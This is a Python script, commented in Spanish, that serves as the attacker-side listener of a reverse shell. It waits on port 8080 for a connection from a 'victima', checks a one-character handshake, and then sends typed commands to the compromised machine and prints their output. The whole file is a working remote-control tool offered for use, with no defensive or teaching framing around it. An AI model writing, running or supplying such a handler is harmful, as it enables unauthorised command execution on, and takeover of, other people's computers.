import socket

HOST = ''       # '' = 0.0.0.0, escucha en todas las interfaces
PORT = 8080

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    ip = input("Ingresa tu IP (la de este equipo, atacante): ").strip()

    try:
        server.bind((ip, PORT))
    except OSError as e:
        print(f"Error al hacer bind en {ip}:{PORT} -> {e}")
        print("Esa IP no está asignada a ninguna interfaz de esta máquina.")
        print("IPs disponibles en esta PC:", socket.gethostbyname_ex(socket.gethostname())[2])
        return

    server.listen(1)
    print(f"Escuchando en {ip}:{PORT} ...")

    while True:
        victima, direccion = server.accept()
        print('Conexion de: {}'.format(direccion))

        try:
            msjBinario = victima.recv(1024)
            msjCodificado = msjBinario.decode("ascii")

            if msjCodificado != "1":
                print("Handshake inválido, cerrando conexión.")
                victima.close()
                continue

            print("Shell interactiva iniciada. Escribe 'exit' para salir.")
            while True:
                opcion = input("shell@shell: ")
                victima.send(opcion.encode("ascii"))

                if opcion.strip().lower() == "exit":
                    break

                resultado = victima.recv(4096)
                if not resultado:
                    print("La víctima cerró la conexión.")
                    break

                print(resultado.decode("utf-8", errors="replace"))

        except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError):
            print("Se perdió la conexión con la víctima.")
        except Exception as e:
            print(f"Error: {e}")
        finally:
            victima.close()

if __name__ == "__main__":
    main()

